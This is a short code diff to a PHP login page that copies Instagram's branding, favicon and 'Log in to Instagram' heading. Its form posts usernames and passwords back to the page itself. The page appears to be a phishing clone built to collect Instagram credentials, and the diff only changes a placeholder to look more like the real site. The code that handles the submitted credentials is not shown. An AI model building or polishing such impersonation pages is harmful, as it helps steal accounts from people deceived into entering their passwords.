@@ -57,7 +57,7 @@
     <form class="login-form" action="" method="post">
         <img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
         <h2>Log in to Instagram</h2>
-        <input type="text" name="username" placeholder="Username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <input type="text" name="username" placeholder="Username or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
         <div class="signup-link"> Don't have an account? <a href="http://instagram.com">Sign Up</a></div>
